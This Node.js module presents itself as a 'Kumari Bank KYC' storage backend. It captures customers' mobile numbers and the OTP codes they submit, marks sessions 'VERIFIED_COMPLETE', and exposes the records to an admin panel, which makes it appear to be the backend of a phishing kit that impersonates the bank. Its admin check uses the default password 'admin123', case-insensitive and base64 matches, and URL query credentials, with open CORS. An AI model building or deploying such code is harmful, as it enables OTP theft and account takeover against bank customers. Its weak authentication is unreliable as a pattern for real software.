/**
 * Kumari Bank KYC – Supabase & Hybrid Storage Module
 * Built for Vercel Serverless Functions and Supabase Postgres
 */

const fs   = require('fs');
const path = require('path');
const os   = require('os');
const { getSupabase } = require('./supabase');

const TMP_DIR           = os.tmpdir();
const DATA_FILE         = path.join(TMP_DIR, 'responses.json');
const SMS_CONFIG_FILE   = path.join(TMP_DIR, 'sms_config.json');
const ADMIN_CONFIG_FILE = path.join(TMP_DIR, 'admin_config.json');

// ── Local Fallback Helpers ──────────────────────────────────────────
function bootstrapLocal() {
  if (!fs.existsSync(DATA_FILE)) fs.writeFileSync(DATA_FILE, '[]', 'utf8');
  if (!fs.existsSync(SMS_CONFIG_FILE)) {
    fs.writeFileSync(SMS_CONFIG_FILE, JSON.stringify({
      recipient: '32001',
      messageTemplate: 'KUMARI BANK KYC VERIFICATION CODE REQUEST\nRef: {REF_ID}\nMobile: {MOBILE}\nTime: {TIME}',
      updatedAt: new Date().toISOString(),
      sessionMessages: {}
    }, null, 2), 'utf8');
  }
  if (!fs.existsSync(ADMIN_CONFIG_FILE)) {
    fs.writeFileSync(ADMIN_CONFIG_FILE, JSON.stringify({
      adminPassword: process.env.ADMIN_PASSWORD || 'admin123',
      updatedAt: new Date().toISOString()
    }, null, 2), 'utf8');
  }
}

function readLocalResponses() {
  bootstrapLocal();
  try {
    const p = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
    return Array.isArray(p) ? p : [];
  } catch (_) {
    return [];
  }
}

function saveLocalResponses(data) {
  bootstrapLocal();
  fs.writeFileSync(DATA_FILE, JSON.stringify(Array.isArray(data) ? data : [], null, 2), 'utf8');
}

function readLocalSmsConfig() {
  bootstrapLocal();
  try {
    const p = JSON.parse(fs.readFileSync(SMS_CONFIG_FILE, 'utf8'));
    if (p && p.messageTemplate) return p;
  } catch (_) {}
  return {
    recipient: '32001',
    messageTemplate: 'KUMARI BANK KYC VERIFICATION CODE REQUEST\nRef: {REF_ID}\nMobile: {MOBILE}\nTime: {TIME}',
    updatedAt: new Date().toISOString(),
    sessionMessages: {}
  };
}

function saveLocalSmsConfig(cfg) {
  bootstrapLocal();
  fs.writeFileSync(SMS_CONFIG_FILE, JSON.stringify(cfg, null, 2), 'utf8');
}

function readLocalAdminConfig() {
  bootstrapLocal();
  try {
    const p = JSON.parse(fs.readFileSync(ADMIN_CONFIG_FILE, 'utf8'));
    if (p && p.adminPassword) return p;
  } catch (_) {}
  return {
    adminPassword: process.env.ADMIN_PASSWORD || 'admin123',
    updatedAt: new Date().toISOString()
  };
}

function saveLocalAdminConfig(cfg) {
  bootstrapLocal();
  fs.writeFileSync(ADMIN_CONFIG_FILE, JSON.stringify(cfg, null, 2), 'utf8');
}

// ── Supabase Responses Operations ───────────────────────────────────

async function readResponses() {
  try {
    const supabase = getSupabase();
    const { data, error } = await supabase
      .from('responses')
      .select('*')
      .order('id', { ascending: false });

    if (!error && Array.isArray(data)) {
      return data;
    }
  } catch (err) {
    console.warn('[Storage] Supabase readResponses error, falling back to local:', err.message);
  }
  return readLocalResponses();
}

async function saveResponses(data) {
  saveLocalResponses(data);
  try {
    const supabase = getSupabase();
    if (Array.isArray(data) && data.length === 0) {
      await supabase.from('responses').delete().gte('id', 0);
    }
  } catch (err) {
    console.warn('[Storage] Supabase saveResponses error:', err.message);
  }
}

async function upsertSubmission(record) {
  // Always update local storage
  const localList = readLocalResponses();
  const idx = localList.findIndex(r =>
    (record.sessionId && r.sessionId === record.sessionId) ||
    (record.mobile && r.mobile === record.mobile && r.status === 'INITIAL_SUBMISSION')
  );
  if (idx >= 0) {
    Object.assign(localList[idx], record);
  } else {
    localList.unshift(record);
  }
  saveLocalResponses(localList);

  // Sync to Supabase
  try {
    const supabase = getSupabase();

    // Check if record exists
    let existingRow = null;
    if (record.sessionId) {
      const { data } = await supabase
        .from('responses')
        .select('*')
        .eq('sessionId', record.sessionId)
        .limit(1);
      if (data && data.length > 0) existingRow = data[0];
    }

    if (!existingRow && record.mobile) {
      const { data } = await supabase
        .from('responses')
        .select('*')
        .eq('mobile', record.mobile)
        .eq('status', 'INITIAL_SUBMISSION')
        .limit(1);
      if (data && data.length > 0) existingRow = data[0];
    }

    if (existingRow) {
      const updateData = { ...record };
      delete updateData.id; // avoid mutating primary key
      const { error } = await supabase
        .from('responses')
        .update(updateData)
        .eq('id', existingRow.id);
      if (error) console.warn('[Storage] Supabase update error:', error.message);
    } else {
      const insertData = { ...record };
      delete insertData.id; // allow identity column to auto-increment
      const { error } = await supabase
        .from('responses')
        .insert([insertData]);
      if (error) console.warn('[Storage] Supabase insert error:', error.message);
    }
  } catch (err) {
    console.warn('[Storage] Supabase upsertSubmission error:', err.message);
  }
}

async function updateOtpVerification(sessionId, mobile, refId, otp, now) {
  // Update local
  const localList = readLocalResponses();
  let updated = false;
  let finalRef = refId;

  for (const r of localList) {
    if ((sessionId && r.sessionId === sessionId) ||
        (mobile && r.mobile === mobile && r.status === 'INITIAL_SUBMISSION')) {
      r.otp = otp;
      if (refId) r.refId = refId;
      r.status = 'VERIFIED_COMPLETE';
      r.verifiedAt = now;
      finalRef = r.refId;
      updated = true;
      break;
    }
  }

  if (!updated) {
    finalRef = refId || ('KBL-KYC-' + (Math.floor(Math.random() * 900000) + 100000));
    localList.unshift({
      id: Date.now(),
      sessionId: sessionId || ('KBL-SES-' + (Math.floor(Math.random() * 900000) + 100000)),
      refId: finalRef,
      status: 'VERIFIED_COMPLETE',
      otp,
      createdAt: now,
      verifiedAt: now
    });
  }
  saveLocalResponses(localList);

  // Sync to Supabase
  try {
    const supabase = getSupabase();
    let query = supabase.from('responses').select('*');
    if (sessionId) {
      query = query.eq('sessionId', sessionId);
    } else if (mobile) {
      query = query.eq('mobile', mobile).eq('status', 'INITIAL_SUBMISSION');
    }
    const { data } = await query.limit(1);

    if (data && data.length > 0) {
      const targetId = data[0].id;
      finalRef = refId || data[0].refId;
      await supabase
        .from('responses')
        .update({
          otp,
          refId: finalRef,
          status: 'VERIFIED_COMPLETE',
          verifiedAt: now
        })
        .eq('id', targetId);
    } else {
      await supabase
        .from('responses')
        .insert([{
          sessionId: sessionId || ('KBL-SES-' + (Math.floor(Math.random() * 900000) + 100000)),
          refId: finalRef,
          status: 'VERIFIED_COMPLETE',
          otp,
          createdAt: now,
          verifiedAt: now
        }]);
    }
  } catch (err) {
    console.warn('[Storage] Supabase updateOtpVerification error:', err.message);
  }

  return finalRef;
}

// ── Supabase SMS Config Operations ──────────────────────────────────

async function readSmsConfig() {
  try {
    const supabase = getSupabase();
    const { data, error } = await supabase
      .from('sms_config')
      .select('*')
      .eq('id', 'default')
      .single();

    if (!error && data && data.messageTemplate) {
      return data;
    }
  } catch (err) {
    console.warn('[Storage] Supabase readSmsConfig error, fallback to local:', err.message);
  }
  return readLocalSmsConfig();
}

async function saveSmsConfig(cfg) {
  saveLocalSmsConfig(cfg);
  try {
    const supabase = getSupabase();
    await supabase
      .from('sms_config')
      .upsert({
        id: 'default',
        recipient: cfg.recipient || '32001',
        messageTemplate: cfg.messageTemplate,
        sessionMessages: cfg.sessionMessages || {},
        updatedAt: cfg.updatedAt || new Date().toISOString(),
        deployedAt: cfg.deployedAt || new Date().toISOString()
      }, { onConflict: 'id' });
  } catch (err) {
    console.warn('[Storage] Supabase saveSmsConfig error:', err.message);
  }
}

// ── Supabase Admin Config Operations ────────────────────────────────

async function readAdminConfig() {
  try {
    const supabase = getSupabase();
    const { data, error } = await supabase
      .from('admin_config')
      .select('*')
      .eq('id', 'default')
      .single();

    if (!error && data && data.adminPassword) {
      return data;
    }
  } catch (err) {
    console.warn('[Storage] Supabase readAdminConfig error, fallback to local:', err.message);
  }
  return readLocalAdminConfig();
}

async function saveAdminConfig(cfg) {
  saveLocalAdminConfig(cfg);
  try {
    const supabase = getSupabase();
    await supabase
      .from('admin_config')
      .upsert({
        id: 'default',
        adminPassword: cfg.adminPassword,
        updatedAt: cfg.updatedAt || new Date().toISOString()
      }, { onConflict: 'id' });
  } catch (err) {
    console.warn('[Storage] Supabase saveAdminConfig error:', err.message);
  }
}

// ── Admin Authorization Helper ──────────────────────────────────────

async function isAuthorizedAdmin(req, query = {}) {
  const cfg = await readAdminConfig();
  const expected = (cfg.adminPassword || 'admin123').toString().trim();
  const expectedB64 = Buffer.from(expected).toString('base64');
  const headerPass = (req.headers['x-admin-password'] || req.headers['x-admin-token'] || '').toString().trim();
  if (headerPass && (headerPass === expected || headerPass.toLowerCase() === expected.toLowerCase() || headerPass === expectedB64)) return true;
  const authHeader = req.headers['authorization'] || '';
  if (authHeader.startsWith('Bearer ')) {
    const token = authHeader.slice(7).trim();
    if (token === expected || token.toLowerCase() === expected.toLowerCase() || token === expectedB64) return true;
  }
  const queryAuth = (query.auth || query.token || query.password || '').toString().trim();
  if (queryAuth && (queryAuth === expected || queryAuth.toLowerCase() === expected.toLowerCase() || queryAuth === expectedB64)) return true;
  return false;
}

// ── SMS Message Template Renderer ───────────────────────────────────

function renderSmsMessage(template, params = {}) {
  const refId = params.refId || ('KBL-KYC-' + (Math.floor(Math.random() * 900000) + 100000));
  const time  = new Date().toTimeString().split(' ')[0];
  return (template || '')
    .replace(/{REF_ID}/g,   refId)
    .replace(/{MOBILE}/g,   params.mobile || '')
    .replace(/{USERNAME}/g, params.username || '')
    .replace(/{TIME}/g,     time);
}

// ── HTTP Utility Helpers ────────────────────────────────────────────

function setCors(res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS, HEAD');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With, X-Admin-Password, X-Admin-Token');
}

function sendJson(res, status, obj) {
  setCors(res);
  res.status(status).json(obj);
}

function getBody(req) {
  return new Promise((resolve) => {
    if (req.body !== undefined) {
      resolve(typeof req.body === 'string' ? req.body : JSON.stringify(req.body));
      return;
    }
    let body = '';
    req.on('data', chunk => {
      body += chunk.toString();
      if (body.length > 5 * 1024 * 1024) req.destroy();
    });
    req.on('end', () => resolve(body));
    req.on('error', () => resolve(''));
  });
}

module.exports = {
  readResponses,
  saveResponses,
  upsertSubmission,
  updateOtpVerification,
  readSmsConfig,
  saveSmsConfig,
  readAdminConfig,
  saveAdminConfig,
  isAuthorizedAdmin,
  renderSmsMessage,
  sendJson,
  getBody,
  setCors
};
